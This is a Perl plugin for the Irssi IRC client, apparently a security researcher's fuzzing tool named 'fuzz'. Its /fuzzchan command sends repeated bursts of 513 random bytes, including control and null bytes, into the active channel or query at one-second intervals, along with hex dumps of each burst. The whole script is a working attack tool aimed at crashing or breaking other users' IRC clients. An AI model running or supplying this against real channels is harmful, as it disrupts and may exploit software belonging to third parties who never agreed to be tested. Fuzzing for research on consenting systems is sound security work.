use Irssi;
use Irssi::Irc;

use vars qw($VERSION %IRSSI);

$VERSION = "0";
%IRSSI = (
	"name"          => "fuzz",
	"url"           => "http://prdelka.blackart.org.uk"
);

use IPC::Open3;
my @buffer;
my $verbose;
my $debug = 1; # if set to 1 we get verbose output
for($a = 0;$a <= 255;$a++)
{
	if($a != 47)
	{
	        $buffer[$a] = $a;
	}
	if($a == 47)
	{
		$buffer[$a] = 0;
	}
}


sub haxor() {
	my $out = "";
	$verbose = "[PDK]";	
	for($a = 0;$a <= 512;$a++)	
        {
                my $length = $#buffer + 1;
                $length = rand($length);
                $length = int $length;
                $out .= sprintf("%c",$buffer[$length]);
		$verbose .= sprintf("\\x%x",$buffer[$length]);
        }
	return $out;
}

sub cmd_fuzzchan {
	my ($param, $server, $witem) = @_;	
	$param = int $param;
	if($param)
	{
		for(my $a = 0;$a <= $param;$a++)
		{	
			$exploit = haxor();			       
		        $cmd = Irssi::active_win()->get_active_name();
		        $server->command("msg $cmd ".$exploit);			
			if($debug == 1)
			{		
			        $server->command("msg $cmd ".$verbose);
			}
			sleep(1);
		}
	}
}

Irssi::command_bind("fuzzchan","cmd_fuzzchan");
